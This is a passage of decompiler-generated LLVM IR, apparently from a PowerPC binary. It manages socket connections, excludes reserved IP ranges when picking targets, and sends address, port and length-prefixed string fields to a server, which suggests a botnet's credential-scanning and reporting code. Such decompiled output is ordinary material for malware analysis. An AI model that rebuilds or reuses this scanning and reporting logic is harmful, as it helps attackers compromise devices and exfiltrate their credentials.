  %v0_10007b04 = phi i32 [ %v1_10007b04, %dec_label_pc_10007b08 ], [ %v1_10007af8, %dec_label_pc_10007ae0 ]
  %v0_10007b00 = phi i32 [ %v1_10007b00, %dec_label_pc_10007b08 ], [ %v0_10007ab4, %dec_label_pc_10007ae0 ]
  %v1_10007b00 = add i32 %v0_10007b00, 1
  store i32 %v1_10007b00, i32* %r9.global-to-local, align 4
  %v1_10007b04 = add i32 %v0_10007b04, -1
  store i32 %v1_10007b04, i32* %ctr.global-to-local, align 4
  %v2_10007b04 = icmp eq i32 %v1_10007b04, 0
  br i1 %v2_10007b04, label %dec_label_pc_10007c30, label %dec_label_pc_10007b08

dec_label_pc_10007b08:                            ; preds = %dec_label_pc_10007b00
  %v1_10007b08 = add i32 %v0_10007b08, 12
  %v2_10007b08 = inttoptr i32 %v1_10007b08 to i32*
  %v3_10007b08 = load i32, i32* %v2_10007b08, align 4
  store i32 %v3_10007b08, i32* %r0.global-to-local, align 4
  store i32 %v0_10007b08, i32* @r3, align 4
  %v1_10007b10 = add i32 %v0_10007b08, 288
  store i32 %v1_10007b10, i32* %r11.global-to-local, align 4
  %v1_10007b14 = icmp slt i32 %v3_10007b08, 0
  %v3_10007b14 = icmp eq i32 %v3_10007b08, 0
  store i1 %v1_10007b14, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007b14, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007b14, label %dec_label_pc_10007b1c, label %dec_label_pc_10007b00

dec_label_pc_10007b1c:                            ; preds = %dec_label_pc_10007b08
  store i32 %v1_10007b00, i32* @r29, align 4
  br label %dec_label_pc_10007b20

dec_label_pc_10007b20:                            ; preds = %dec_label_pc_10007abc, %dec_label_pc_10007b1c
  %v1_10007b28 = phi i32 [ %v2_10007ad0, %dec_label_pc_10007abc ], [ %v0_10007b08, %dec_label_pc_10007b1c ]
  %v1_10007b20 = icmp slt i32 %v1_10007b28, 0
  %v3_10007b20 = icmp eq i32 %v1_10007b28, 0
  store i1 %v1_10007b20, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007b20, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007b20, label %dec_label_pc_10007c30, label %dec_label_pc_10007b28

dec_label_pc_10007b28:                            ; preds = %dec_label_pc_10007b20
  %v2_10007b28 = add i32 %v1_10007b28, 16
  %v3_10007b28 = inttoptr i32 %v2_10007b28 to i32*
  store i32 %tmp106, i32* %v3_10007b28, align 4
  %v0_10007b2c = load i32, i32* @r8, align 4
  %v1_10007b2c = trunc i32 %v0_10007b2c to i16
  %v2_10007b2c = load i32, i32* @r3, align 4
  %v3_10007b2c = add i32 %v2_10007b2c, 20
  %v4_10007b2c = inttoptr i32 %v3_10007b2c to i16*
  store i16 %v1_10007b2c, i16* %v4_10007b2c, align 2
  store i32 268466996, i32* @lr, align 4
  %v0_10007b30 = call i32 @setup_connection()
  %v1_10007a04.pre.pre = load i32, i32* @r25, align 4
  br label %dec_label_pc_100079fc

dec_label_pc_10007b38:                            ; preds = %dec_label_pc_10008a04
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10007b48 = load i32, i32* @r29, align 4
  store i32 0, i32* %stack_var_-1932, align 4
  store i32 268467028, i32* @lr, align 4
  %v4_10007b50 = call i32 @__libc_send(i32 %v0_10007b48, i32 %v1_10007ed4, i32 1, i32 16384)
  %v0_10007b60 = load i32, i32* @r29, align 4
  store i32 268467048, i32* @lr, align 4
  %v4_10007b64 = call i32 @__libc_send(i32 %v0_10007b60, i32 %v2_10008918, i32 4, i32 16384)
  %v1_10007b68 = ptrtoint i32* %stack_var_-1944 to i32
  %v0_10007b74 = load i32, i32* @r29, align 4
  store i32 268467068, i32* @lr, align 4
  %v4_10007b78 = call i32 @__libc_send(i32 %v0_10007b74, i32 %v1_10007b68, i32 2, i32 16384)
  %v0_10007b7c = load i32, i32* @r27, align 4
  %v1_10007b7c = add i32 %v0_10007b7c, 12
  %v0_10007b88 = load i32, i32* @r29, align 4
  store i32 268467088, i32* @lr, align 4
  %v4_10007b8c = call i32 @__libc_send(i32 %v0_10007b88, i32 %v1_10007b7c, i32 1, i32 16384)
  %v0_10007b90 = load i32, i32* @r27, align 4
  %v1_10007b90 = inttoptr i32 %v0_10007b90 to i32*
  %v2_10007b90 = load i32, i32* %v1_10007b90, align 4
  %v1_10007b94 = add i32 %v0_10007b90, 12
  %v2_10007b94 = inttoptr i32 %v1_10007b94 to i8*
  %v3_10007b94 = load i8, i8* %v2_10007b94, align 1
  %v4_10007b94 = zext i8 %v3_10007b94 to i32
  %v0_10007b9c = load i32, i32* @r29, align 4
  store i32 268467108, i32* @lr, align 4
  %v4_10007ba0 = call i32 @__libc_send(i32 %v0_10007b9c, i32 %v2_10007b90, i32 %v4_10007b94, i32 16384)
  %v0_10007ba4 = load i32, i32* @r27, align 4
  %v1_10007ba4 = add i32 %v0_10007ba4, 13
  %v0_10007bb0 = load i32, i32* @r29, align 4
  store i32 268467128, i32* @lr, align 4
  %v4_10007bb4 = call i32 @__libc_send(i32 %v0_10007bb0, i32 %v1_10007ba4, i32 1, i32 16384)
  %v0_10007bb8 = load i32, i32* @r27, align 4
  %v1_10007bb8 = add i32 %v0_10007bb8, 13
  %v2_10007bb8 = inttoptr i32 %v1_10007bb8 to i8*
  %v3_10007bb8 = load i8, i8* %v2_10007bb8, align 1
  %v4_10007bb8 = zext i8 %v3_10007bb8 to i32
  %v1_10007bbc = add i32 %v0_10007bb8, 4
  %v2_10007bbc = inttoptr i32 %v1_10007bbc to i32*
  %v3_10007bbc = load i32, i32* %v2_10007bbc, align 4
  %v0_10007bc0 = load i32, i32* @r29, align 4
  store i32 268467148, i32* @lr, align 4
  %v4_10007bc8 = call i32 @__libc_send(i32 %v0_10007bc0, i32 %v3_10007bbc, i32 %v4_10007bb8, i32 16384)
  %v0_10007bcc = load i32, i32* @r29, align 4
  store i32 %v0_10007bcc, i32* @r3, align 4
  %v0_10007bd0 = call i32 @__GI___libc_close()
  br label %dec_label_pc_10007bd4

dec_label_pc_10007bd4:                            ; preds = %dec_label_pc_100089e8, %dec_label_pc_100073fc, %dec_label_pc_10007d5c, %dec_label_pc_10007b38
  %stack_var_-96.6.off0 = phi i32 [ %extract.t34, %dec_label_pc_100073fc ], [ %stack_var_-96.5.off0, %dec_label_pc_10007b38 ], [ %extract.t34, %dec_label_pc_10007d5c ], [ %stack_var_-96.5.off0, %dec_label_pc_100089e8 ]
  %v0_10007bd8 = call i32 @__GI_exit()
  br label %dec_label_pc_10007bdc

dec_label_pc_10007bdc:                            ; preds = %dec_label_pc_10007880, %dec_label_pc_10007bd4
  %v0_1000792465 = phi i32 [ %v0_10007bd8, %dec_label_pc_10007bd4 ], [ %v1_10007848, %dec_label_pc_10007880 ]
  %stack_var_-96.7.off0 = phi i32 [ %stack_var_-96.6.off0, %dec_label_pc_10007bd4 ], [ %stack_var_-96.2.off0.ph, %dec_label_pc_10007880 ]
  %v0_10007bdc = load i32, i32* @r9, align 4
  %v1_10007bdc = icmp slt i32 %v0_10007bdc, 168
  %v3_10007bdc = icmp eq i32 %v0_10007bdc, 168
  store i1 %v1_10007bdc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007bdc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007bdc, label %dec_label_pc_10007834.preheader, label %dec_label_pc_10007bdc.dec_label_pc_100078b0_crit_edge

dec_label_pc_10007bdc.dec_label_pc_100078b0_crit_edge: ; preds = %dec_label_pc_10007bdc
  %v0_100078b0.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_100078b0

dec_label_pc_10007be8:                            ; preds = %dec_label_pc_10007890
  %v0_10007be8 = load i32, i32* @r9, align 4
  %v1_10007be8 = icmp ult i32 %v0_10007be8, 63
  %v3_10007be8 = icmp eq i32 %v0_10007be8, 63
  store i1 %v1_10007be8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007be8, i1* %cr7_eq.global-to-local, align 1
  %tmp164 = icmp ult i32 %v0_10007be8, 64
  br i1 %tmp164, label %dec_label_pc_100078b0, label %dec_label_pc_10007bf0

dec_label_pc_10007bf0:                            ; preds = %dec_label_pc_10007be8
  %v1_10007bf0 = icmp ult i32 %v0_10007be8, 126
  %v3_10007bf0 = icmp eq i32 %v0_10007be8, 126
  store i1 %v1_10007bf0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007bf0, i1* %cr7_eq.global-to-local, align 1
  %tmp165 = icmp ult i32 %v0_10007be8, 127
  br i1 %tmp165, label %dec_label_pc_10007834, label %dec_label_pc_100078b0

dec_label_pc_10007bfc:                            ; preds = %dec_label_pc_10007898
  %v0_10007bfc = load i32, i32* @r9, align 4
  %v1_10007bfc = icmp slt i32 %v0_10007bfc, 255
  %v3_10007bfc = icmp eq i32 %v0_10007bfc, 255
  store i1 %v1_10007bfc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007bfc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007bfc, label %dec_label_pc_10007834, label %dec_label_pc_10007918

dec_label_pc_10007c08:                            ; preds = %dec_label_pc_10007888
  %v0_10007c08 = load i32, i32* @r9, align 4
  %v1_10007c08 = icmp ult i32 %v0_10007c08, 15
  %v3_10007c08 = icmp eq i32 %v0_10007c08, 15
  store i1 %v1_10007c08, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007c08, i1* %cr7_eq.global-to-local, align 1
  %tmp166 = icmp ult i32 %v0_10007c08, 16
  br i1 %tmp166, label %dec_label_pc_100078b0, label %dec_label_pc_10007c10

dec_label_pc_10007c10:                            ; preds = %dec_label_pc_10007c08
  %v1_10007c10 = icmp ult i32 %v0_10007c08, 31
  %v3_10007c10 = icmp eq i32 %v0_10007c08, 31
  store i1 %v1_10007c10, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007c10, i1* %cr7_eq.global-to-local, align 1
  %tmp167 = icmp ult i32 %v0_10007c08, 32
  br i1 %tmp167, label %dec_label_pc_10007834, label %dec_label_pc_100078b0

dec_label_pc_10007c1c:                            ; preds = %dec_label_pc_100078a0
  %v0_10007c1c = load i32, i32* @r9, align 4
  %v1_10007c1c = icmp ult i32 %v0_10007c1c, 17
  %v3_10007c1c = icmp eq i32 %v0_10007c1c, 17
  store i1 %v1_10007c1c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007c1c, i1* %cr7_eq.global-to-local, align 1
  %tmp168 = icmp ult i32 %v0_10007c1c, 18
  br i1 %tmp168, label %dec_label_pc_100078b0, label %dec_label_pc_10007c24

dec_label_pc_10007c24:                            ; preds = %dec_label_pc_10007c1c
  %v1_10007c24 = icmp eq i32 %v0_10007c1c, 18
  %v3_10007c24 = icmp eq i32 %v0_10007c1c, 19
  store i1 %v1_10007c24, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007c24, i1* %cr7_eq.global-to-local, align 1
  %tmp169 = icmp ult i32 %v0_10007c1c, 20
  br i1 %tmp169, label %dec_label_pc_10007834, label %dec_label_pc_10007918

dec_label_pc_10007c30:                            ; preds = %dec_label_pc_10007b20, %dec_label_pc_10007ab4, %dec_label_pc_10007a28, %dec_label_pc_100079fc, %dec_label_pc_10007b00
  store i32 4, i32* %r9.global-to-local, align 4
  store i32 31, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-1888, align 4
  br label %dec_label_pc_10007c44

dec_label_pc_10007c44:                            ; preds = %dec_label_pc_10007c44, %dec_label_pc_10007c30
  %v1_10007c48 = phi i32 [ %v1_10007c4c, %dec_label_pc_10007c44 ], [ 4, %dec_label_pc_10007c30 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10007c48 = load i32, i32* @r17, align 4
  %v3_10007c48 = add i32 %v2_10007c48, %v1_10007c48
  %v4_10007c48 = inttoptr i32 %v3_10007c48 to i32*
  store i32 0, i32* %v4_10007c48, align 4
  %v0_10007c4c = load i32, i32* %r9.global-to-local, align 4
  %v1_10007c4c = add i32 %v0_10007c4c, 4
  store i32 %v1_10007c4c, i32* %r9.global-to-local, align 4
  %v0_10007c50 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007c50 = add i32 %v0_10007c50, -1
  store i32 %v1_10007c50, i32* %ctr.global-to-local, align 4
  %v2_10007c50 = icmp eq i32 %v1_10007c50, 0
  br i1 %v2_10007c50, label %dec_label_pc_10007c54, label %dec_label_pc_10007c44

dec_label_pc_10007c54:                            ; preds = %dec_label_pc_10007c44
  %v0_10007c54 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10007c54, i32* %stack_var_-1760, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  store i32 31, i32* %ctr.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007c64

dec_label_pc_10007c64:                            ; preds = %dec_label_pc_10007c64, %dec_label_pc_10007c54
  %v1_10007c68 = phi i32 [ %v1_10007c6c, %dec_label_pc_10007c64 ], [ 4, %dec_label_pc_10007c54 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10007c68 = load i32, i32* @r14, align 4
  %v3_10007c68 = add i32 %v2_10007c68, %v1_10007c68
  %v4_10007c68 = inttoptr i32 %v3_10007c68 to i32*
  store i32 0, i32* %v4_10007c68, align 4
  %v0_10007c6c = load i32, i32* %r9.global-to-local, align 4
  %v1_10007c6c = add i32 %v0_10007c6c, 4
  store i32 %v1_10007c6c, i32* %r9.global-to-local, align 4
  %v0_10007c70 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007c70 = add i32 %v0_10007c70, -1
  store i32 %v1_10007c70, i32* %ctr.global-to-local, align 4
  %v2_10007c70 = icmp eq i32 %v1_10007c70, 0
  br i1 %v2_10007c70, label %dec_label_pc_10007c74, label %dec_label_pc_10007c64

dec_label_pc_10007c74:                            ; preds = %dec_label_pc_10007c64
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v0_10007c7c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10007c7c, i32* %stack_var_-1936, align 4
  br label %dec_label_pc_10007cd0

dec_label_pc_10007c84:                            ; preds = %dec_label_pc_10007d08
  %v0_10007c84 = load i32, i32* %r10.global-to-local, align 4
  %v1_10007c84 = icmp slt i32 %v0_10007c84, 1
  %v3_10007c84 = icmp eq i32 %v0_10007c84, 1
  store i1 %v1_10007c84, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007c84, i1* %cr7_eq.global-to-local, align 1
  %v1_10008ad0 = add i32 %v0_10007d0c, 4
  %v2_10008ad0 = inttoptr i32 %v1_10008ad0 to i32*
  %v3_10008ad0 = load i32, i32* %v2_10008ad0, align 4
  br i1 %v3_10007c84, label %dec_label_pc_10008ad0, label %dec_label_pc_10007c8c

dec_label_pc_10007c8c:                            ; preds = %dec_label_pc_10007c84
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10007c94 = call i32 @__asm_rlwinm(i32 %v3_10008ad0, i32 29, i32 3, i32 29)
  %v1_10007c98 = load i32, i32* %r27.global-to-local, align 4
  %v2_10007c98 = icmp slt i32 %v3_10008ad0, %v1_10007c98
  %v3_10007c98 = icmp sgt i32 %v3_10008ad0, %v1_10007c98
  %v4_10007c98 = icmp eq i32 %v3_10008ad0, %v1_10007c98
  store i1 %v2_10007c98, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007c98, i1* %cr7_eq.global-to-local, align 1
  %v1_10007c9c = load i32, i32* @r22, align 4
  %v2_10007c9c = add i32 %v1_10007c9c, %v1_10007c94
  store i32 %v2_10007c9c, i32* %r11.global-to-local, align 4
  %v1_10007ca0 = urem i32 %v3_10008ad0, 32
  store i32 %v1_10007ca0, i32* %r10.global-to-local, align 4
  %v1_10007ca4 = add i32 %v2_10007c9c, 56
  %v2_10007ca4 = inttoptr i32 %v1_10007ca4 to i32*
  %v3_10007ca4 = load i32, i32* %v2_10007ca4, align 4
  %v0_10007ca8 = load i32, i32* %r0.global-to-local, align 4
  %v3_10007ca8 = shl i32 %v0_10007ca8, %v1_10007ca0
  store i32 %v3_10007ca8, i32* %r0.global-to-local, align 4
  %v2_10007cac = or i32 %v3_10007ca8, %v3_10007ca4
  store i32 %v2_10007cac, i32* %r9.global-to-local, align 4
  store i32 %v2_10007cac, i32* %v2_10007ca4, align 4
  br i1 %v3_10007c98, label %dec_label_pc_10007cb8, label %dec_label_pc_10007cbc

dec_label_pc_10007cb8:                            ; preds = %dec_label_pc_10007c8c
  store i32 %v3_10008ad0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10007cbc

dec_label_pc_10007cbc:                            ; preds = %dec_label_pc_10008ad0, %dec_label_pc_10007c8c, %dec_label_pc_10007cd0, %dec_label_pc_10008b00, %dec_label_pc_10008af8, %dec_label_pc_10007d50, %dec_label_pc_10007cb8
  %v3_10007cbc = load i32, i32* %stack_var_-1936, align 4
  store i32 %v3_10007cbc, i32* %r9.global-to-local, align 4
  %v1_10007cc0 = add i32 %v3_10007cbc, 1
  store i32 %v1_10007cc0, i32* %r0.global-to-local, align 4
  %v1_10007cc4 = icmp slt i32 %v1_10007cc0, 255
  %v2_10007cc4 = icmp sgt i32 %v1_10007cc0, 255
  %v3_10007cc4 = icmp eq i32 %v1_10007cc0, 255
  store i1 %v1_10007cc4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007cc4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10007cc0, i32* %stack_var_-1936, align 4
  br i1 %v2_10007cc4, label %dec_label_pc_10007d74, label %dec_label_pc_10007cd0

dec_label_pc_10007cd0:                            ; preds = %dec_label_pc_10007cbc, %dec_label_pc_10007c74
  %v0_10007cd4 = phi i32 [ %v1_10007cc0, %dec_label_pc_10007cbc ], [ %v0_10007c7c, %dec_label_pc_10007c74 ]
  store i32 268566528, i32* %r10.global-to-local, align 4
  %v1_10007cd4 = mul i32 %v0_10007cd4, 256
  store i32 %v1_10007cd4, i32* %r11.global-to-local, align 4
  %v3_10007cd8 = load i32, i32* @global_var_10021208.157, align 4
  store i32 %v3_10007cd8, i32* %r9.global-to-local, align 4
  %v2_10007ce0 = mul i32 %v0_10007cd4, 288
  store i32 %v2_10007ce0, i32* %r0.global-to-local, align 4
  %v2_10007ce4 = add i32 %v3_10007cd8, %v2_10007ce0
  store i32 %v2_10007ce4, i32* @r29, align 4
  %v1_10007ce8 = add i32 %v2_10007ce4, 12
  %v2_10007ce8 = inttoptr i32 %v1_10007ce8 to i32*
  %v3_10007ce8 = load i32, i32* %v2_10007ce8, align 4
  store i32 %v3_10007ce8, i32* %r10.global-to-local, align 4
  %v1_10007cec = icmp slt i32 %v3_10007ce8, 0
  %v3_10007cec = icmp eq i32 %v3_10007ce8, 0
  store i1 %v1_10007cec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007cec, i1* %cr7_eq.global-to-local, align 1
  %v1_10007cf0 = sub i32 1, %v3_10007ce8
  %v2_10007cf0 = sub i32 -1, %v3_10007ce8
  %not.v4_10007cf0 = icmp ule i32 %v1_10007cf0, %v2_10007cf0
  %v1_10007cf8 = sext i1 %not.v4_10007cf0 to i32
  store i32 %v1_10007cf8, i32* %r0.global-to-local, align 4
  %v1_10007cfc = call i32 @__asm_rlwinm(i32 %v1_10007cf8, i32 0, i32 29, i32 26)
  %v1_10007d00 = add i32 %v1_10007cfc, 30
  store i32 %v1_10007d00, i32* %r11.global-to-local, align 4
  %v0_10007d04 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007d04, label %dec_label_pc_10007cbc, label %dec_label_pc_10007d08

dec_label_pc_10007d08:                            ; preds = %dec_label_pc_10007cd0
  %v3_10007d08 = load i32, i32* @global_var_100211f8.152, align 4
  store i32 %v3_10007d08, i32* %r0.global-to-local, align 4
  %v0_10007d0c = load i32, i32* @r29, align 4
  %v1_10007d0c = add i32 %v0_10007d0c, 8
  %v2_10007d0c = inttoptr i32 %v1_10007d0c to i32*
  %v3_10007d0c = load i32, i32* %v2_10007d0c, align 4
  store i32 %v3_10007d0c, i32* %r9.global-to-local, align 4
  %v2_10007d10 = sub i32 %v3_10007d08, %v3_10007d0c
  store i32 %v2_10007d10, i32* %r0.global-to-local, align 4
  %v2_10007d14 = icmp ult i32 %v2_10007d10, %v1_10007d00
  %v3_10007d14 = icmp ugt i32 %v2_10007d10, %v1_10007d00
  %v4_10007d14 = icmp eq i32 %v2_10007d10, %v1_10007d00
  store i1 %v2_10007d14, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007d14, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007d14, label %dec_label_pc_10007d1c, label %dec_label_pc_10007c84

dec_label_pc_10007d1c:                            ; preds = %dec_label_pc_10007d08
  %v1_10007d1c = add i32 %v0_10007d0c, 4
  %v2_10007d1c = inttoptr i32 %v1_10007d1c to i32*
  %v3_10007d1c = load i32, i32* %v2_10007d1c, align 4
  store i32 %v3_10007d1c, i32* @r3, align 4
  %v0_10007d20 = call i32 @__GI___libc_close()
  %v0_10007d24 = load i32, i32* @r29, align 4
  %v1_10007d24 = add i32 %v0_10007d24, 12
  %v2_10007d24 = inttoptr i32 %v1_10007d24 to i32*
  %v3_10007d24 = load i32, i32* %v2_10007d24, align 4
  store i32 %v3_10007d24, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v1_10007d2c = icmp ult i32 %v3_10007d24, 2
  %v3_10007d2c = icmp eq i32 %v3_10007d24, 2
  store i1 %v1_10007d2c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007d2c, i1* %cr7_eq.global-to-local, align 1
  %v2_10007d30 = add i32 %v0_10007d24, 4
  %v3_10007d30 = inttoptr i32 %v2_10007d30 to i32*
  store i32 -1, i32* %v3_10007d30, align 4
  %tmp171 = icmp ult i32 %v3_10007d24, 3
  br i1 %tmp171, label %dec_label_pc_10008b00, label %dec_label_pc_10007d38

dec_label_pc_10007d38:                            ; preds = %dec_label_pc_10007d1c
  %v0_10007d38 = load i32, i32* @r29, align 4
  %v1_10007d38 = add i32 %v0_10007d38, 284
  %v2_10007d38 = inttoptr i32 %v1_10007d38 to i8*
  %v3_10007d38 = load i8, i8* %v2_10007d38, align 1
  %v4_10007d38 = zext i8 %v3_10007d38 to i32
  %v1_10007d3c = add nuw nsw i32 %v4_10007d38, 1
  %v1_10007d40 = urem i32 %v1_10007d3c, 256
  store i32 %v1_10007d40, i32* %r9.global-to-local, align 4
  %v1_10007d44 = icmp ult i32 %v1_10007d40, 10
  %v3_10007d44 = icmp eq i32 %v1_10007d40, 10
  store i1 %v1_10007d44, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007d44, i1* %cr7_eq.global-to-local, align 1
  %v1_10007d48 = trunc i32 %v1_10007d3c to i8
  store i8 %v1_10007d48, i8* %v2_10007d38, align 1
  %v0_10007d4c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007d4c, label %dec_label_pc_10008b00, label %dec_label_pc_10007d50

dec_label_pc_10007d50:                            ; preds = %dec_label_pc_10007d38
  %v0_10007d50 = load i32, i32* @r29, align 4
  store i32 %v0_10007d50, i32* @r3, align 4
  store i32 268467544, i32* @lr, align 4
  %v0_10007d54 = call i32 @setup_connection()
  br label %dec_label_pc_10007cbc

dec_label_pc_10007d5c:                            ; preds = %dec_label_pc_10007420
  %v3_10007d5c = load i32, i32* @global_var_1002120c.158, align 4
  store i32 %v3_10007d5c, i32* @r3, align 4
  %v0_10007d60 = call i32 @__GI___libc_close()
  br label %dec_label_pc_10007bd4

dec_label_pc_10007d74:                            ; preds = %dec_label_pc_10007cbc
  %v0_10007d74 = load i32, i32* @r28, align 4
  %v1_10007d74 = load i32, i32* %r27.global-to-local, align 4
  %v2_10007d74 = icmp slt i32 %v0_10007d74, %v1_10007d74
  %v4_10007d74 = icmp eq i32 %v0_10007d74, %v1_10007d74
  store i1 %v2_10007d74, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007d74, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %stack_var_-1924, align 4
  br i1 %v2_10007d74, label %dec_label_pc_10007d90, label %dec_label_pc_10007d94

dec_label_pc_10007d90:                            ; preds = %dec_label_pc_10007d74
  br label %dec_label_pc_10007d94

dec_label_pc_10007d94:                            ; preds = %dec_label_pc_10007d74, %dec_label_pc_10007d90
  %v0_10007da4 = phi i32 [ %v0_10007d74, %dec_label_pc_10007d74 ], [ %v1_10007d74, %dec_label_pc_10007d90 ]
  %v1_10007d94 = ptrtoint i32* %stack_var_-1888 to i32
  %v1_10007d98 = ptrtoint i32* %stack_var_-1760 to i32
  %v1_10007da0 = ptrtoint i32* %stack_var_-1924 to i32
  store i32 %v1_10007da0, i32* %r7.global-to-local, align 4
  %v1_10007da4 = add i32 %v0_10007da4, 1
  store i32 ptrtoint ([3 x i8]* @global_var_10007dac.207 to i32), i32* @lr, align 4
  %v5_10007da8 = call i32 @__libc_select(i32 %v1_10007da4, i32 %v1_10007d94, i32 %v1_10007d98, i32 0, i32 %v1_10007da0)
  %v0_10007db0 = call i32 @__GI_time()
  %v0_10007db4 = load i32, i32* @r29, align 4
  store i32 %v0_10007db4, i32* %stack_var_-1936, align 4
  store i32 %v0_10007db0, i32* @global_var_100211f8.152, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10007ed4 = ptrtoint i32* %stack_var_-1932 to i32
  %v2_10008a3c = ptrtoint i32* %stack_var_-1904 to i32
  %v2_10008918 = ptrtoint i32* %stack_var_-1928 to i32
  br label %dec_label_pc_10007dc0

dec_label_pc_10007dc0:                            ; preds = %dec_label_pc_10008804, %dec_label_pc_10007d94
  %v0_10007dc4 = phi i32 [ %v1_10008808, %dec_label_pc_10008804 ], [ 0, %dec_label_pc_10007d94 ]
  store i32 268566528, i32* %r10.global-to-local, align 4
  %v1_10007dc4 = mul i32 %v0_10007dc4, 256
  store i32 %v1_10007dc4, i32* %r11.global-to-local, align 4
  %v3_10007dc8 = load i32, i32* @global_var_10021208.157, align 4
  store i32 %v3_10007dc8, i32* %r9.global-to-local, align 4
  %v2_10007dd0 = mul i32 %v0_10007dc4, 288
  store i32 %v2_10007dd0, i32* %r0.global-to-local, align 4
  %v2_10007dd4 = add i32 %v3_10007dc8, %v2_10007dd0
  store i32 %v2_10007dd4, i32* @r28, align 4
  %v1_10007dd8 = add i32 %v2_10007dd4, 4
  %v2_10007dd8 = inttoptr i32 %v1_10007dd8 to i32*
  %v3_10007dd8 = load i32, i32* %v2_10007dd8, align 4
  %v1_10007ddc = icmp slt i32 %v3_10007dd8, -1
  %v3_10007ddc = icmp eq i32 %v3_10007dd8, -1
  store i1 %v1_10007ddc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007ddc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007ddc, label %dec_label_pc_10008804, label %dec_label_pc_10007de4

dec_label_pc_10007de4:                            ; preds = %dec_label_pc_10007dc0
  %v1_10007de4 = call i32 @__asm_rlwinm(i32 %v3_10007dd8, i32 29, i32 3, i32 29)
  store i32 %v1_10007de4, i32* %r8.global-to-local, align 4
  %v1_10007de8 = urem i32 %v3_10007dd8, 32
  store i32 %v1_10007de8, i32* %r10.global-to-local, align 4
  %v1_10007dec = load i32, i32* @r22, align 4
  %v2_10007dec = add i32 %v1_10007dec, %v1_10007de4
  store i32 %v2_10007dec, i32* %r9.global-to-local, align 4
  %v1_10007df0 = add i32 %v2_10007dec, 184
  %v2_10007df0 = inttoptr i32 %v1_10007df0 to i32*
  %v3_10007df0 = load i32, i32* %v2_10007df0, align 4
  %v3_10007df4 = sub i32 0, %v3_10007dd8
  %v4_10007df4 = urem i32 %v3_10007df4, 32
  %v5_10007df4 = shl i32 %v3_10007df0, %v4_10007df4
  %v6_10007df4 = xor i32 %v4_10007df4, 31
  %v7_10007df4 = lshr i32 %v3_10007df0, %v6_10007df4
  %v8_10007df4 = udiv i32 %v7_10007df4, 2
  %v9_10007df4 = or i32 %v8_10007df4, %v5_10007df4
  %v12_10007df4 = lshr i32 -1, %v1_10007de8
  %v14_10007df4 = and i32 %v9_10007df4, %v12_10007df4
  %v15_10007df4 = ashr i32 %v3_10007df0, 31
  %v16_10007df4 = sub i32 -1, %v12_10007df4
  %v17_10007df4 = and i32 %v15_10007df4, %v16_10007df4
  %v18_10007df4 = or i32 %v14_10007df4, %v17_10007df4
  store i32 %v18_10007df4, i32* %r0.global-to-local, align 4
  %v1_10007df8 = urem i32 %v18_10007df4, 2
  store i32 %v1_10007df8, i32* %r11.global-to-local, align 4
  %v3_10007df8 = icmp eq i32 %v1_10007df8, 0
  br i1 %v3_10007df8, label %dec_label_pc_10007e00, label %dec_label_pc_10008904

dec_label_pc_10007e00:                            ; preds = %dec_label_pc_10007de4, %dec_label_pc_100089a4
  %v1_10007e08 = phi i32 [ %v1_10007de8, %dec_label_pc_10007de4 ], [ %v1_10007e08.pre, %dec_label_pc_100089a4 ]
  %v1_10007e00 = phi i32 [ %v1_10007dec, %dec_label_pc_10007de4 ], [ %v1_10007e00.pre, %dec_label_pc_100089a4 ]
  %v0_10007e00 = phi i32 [ %v1_10007de4, %dec_label_pc_10007de4 ], [ %v0_10007e00.pre, %dec_label_pc_100089a4 ]
  %v2_10007e00 = add i32 %v0_10007e00, %v1_10007e00
  store i32 %v2_10007e00, i32* %r9.global-to-local, align 4
  %v1_10007e04 = add i32 %v2_10007e00, 56
  %v2_10007e04 = inttoptr i32 %v1_10007e04 to i32*
